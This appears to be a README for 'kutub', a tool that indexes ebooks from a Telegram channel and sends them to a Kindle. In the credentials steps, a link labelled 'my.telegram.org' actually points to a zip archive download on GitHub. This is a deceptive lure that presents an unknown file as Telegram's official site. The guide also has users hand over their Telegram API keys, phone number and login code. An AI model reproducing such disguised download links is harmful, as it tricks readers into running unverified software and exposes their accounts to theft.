## ⚙️ How kutub Works

kutub works by connecting to a Telegram channel you choose and building a searchable index of all the books posted there. Here's what happens behind the scenes:

1. **Connect to Telegram**: You provide your Telegram API credentials (don't worry, it's easy to get these)
2. **Choose a Channel**: Select the book channel you want to index
3. **Index Books**: kutub scans the channel and catalogs every ebook it finds
4. **Search and Send**: Use the search bar to find books, then send them to your Kindle

The entire process is automated and requires no technical knowledge.

## 📝 Step-by-Step Setup Guide

### Getting Your Telegram API Credentials

Before kutub can work, you need to get API credentials from Telegram. Here's how:

1. Visit [my.telegram.org](https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip)
2. Log in with your phone number
3. Click "API Development Tools"
4. Fill in the form (any name works)
5. Copy your **API ID** and **API Hash** - you'll need these for kutub

### Connecting kutub to Telegram

1. Run kutub on your computer
2. Enter your API ID and API Hash when prompted
3. Enter your phone number
4. Enter the verification code Telegram sends you
5. Choose the book channel you want to index

### Building Your Library

Once connected, kutub will:
- Scan the channel history
- Identify all ebook files
- Create a searchable index
- Show you a summary of what was found

The indexing process might take a few minutes for large channels, but you only need to do it once.

## 🔄 Updating Your Library

## 💡 Tips and Tricks

### Organize Large Libraries
Use keywords and tags to organize books by genre, author, or reading status. This makes finding books even faster.

### Backup Your Database
Your entire library index is stored in one file. Copy this file to an external drive or cloud storage to keep your library safe.

### Search Like a Pro
Use quotes for exact phrases: `"harry potter"` finds only exact matches.
Combine terms: `fantasy arabic` finds Arabic fantasy books.

## 🆘 Troubleshooting

### Connection Issues
If kutub can't connect to Telegram:
- Check your internet connection
- Verify your API credentials are correct
- Make sure your phone number is entered correctly

### Indexing Slow
For very large channels, indexing might take time. This is normal. Let it run in the background.

### Kindle Not Receiving Books
- Ensure your Kindle is connected to Wi-Fi
- Check that your Kindle email address is correct
- Verify your Amazon account settings
